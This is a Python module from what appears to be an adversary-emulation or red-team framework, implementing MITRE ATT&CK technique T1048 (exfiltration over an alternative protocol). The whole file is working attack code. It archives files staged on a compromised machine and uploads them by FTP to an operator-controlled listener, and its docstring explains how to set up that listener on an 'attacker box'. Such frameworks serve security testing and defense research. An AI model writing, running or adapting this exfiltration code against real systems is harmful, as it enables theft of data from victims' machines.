"""
techniques/exfiltration/ftp_exfil.py
ATT&CK: T1048 — Exfiltration Over Alternative Protocol
Tactic:  Exfiltration

Exfiltrates staged files via FTP to a listener you control.
In a lab context, run `python -m pyftpdlib -p 2121 -w` on your
attacker box to stand up a writable FTP server instantly.
Uses Python's built-in ftplib — no extra dependencies.
"""

import ftplib
import io
import os
import zipfile
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique


class FTPExfil(Technique):
    name = "ftp-exfil"
    attack_id = "T1048"
    tactic = Tactic.EXFILTRATION

    def __init__(
        self,
        ftp_host: str,
        ftp_port: int = 21,
        username: str = "anonymous",
        password: str = "anonymous@",
        archive_name: str = "exfil.zip",
        timeout: float = 10.0,
    ):
        self.ftp_host = ftp_host
        self.ftp_port = ftp_port
        self.username = username
        self.password = password
        self.archive_name = archive_name
        self.timeout = timeout

    def _build_archive(self, paths: list[str]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for path in paths:
                if os.path.isfile(path):
                    zf.write(path, arcname=os.path.basename(path))
        return buf.getvalue()

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        staged = [sf.path for sf in context.staged_files]
        existing = [p for p in staged if os.path.isfile(p)]

        if not existing:
            return False, "No staged files in Context to exfiltrate via FTP", {
                "staged_files": staged
            }

        archive_bytes = self._build_archive(existing)
        buf = io.BytesIO(archive_bytes)

        try:
            ftp = ftplib.FTP()
            ftp.connect(self.ftp_host, self.ftp_port, timeout=self.timeout)
            ftp.login(self.username, self.password)
            ftp.storbinary(f"STOR {self.archive_name}", buf)
            ftp.quit()

            summary = (
                f"FTP exfiltration complete: {len(existing)} file(s) "
                f"({len(archive_bytes)} bytes) → "
                f"ftp://{self.ftp_host}:{self.ftp_port}/{self.archive_name}"
            )
            return True, summary, {
                "ftp_host": self.ftp_host,
                "ftp_port": self.ftp_port,
                "files_exfiltrated": existing,
                "archive_size_bytes": len(archive_bytes),
                "archive_name": self.archive_name,
            }
        except Exception as exc:
            return False, f"FTP exfiltration failed: {exc}", {
                "ftp_host": self.ftp_host,
                "error": str(exc),
            }
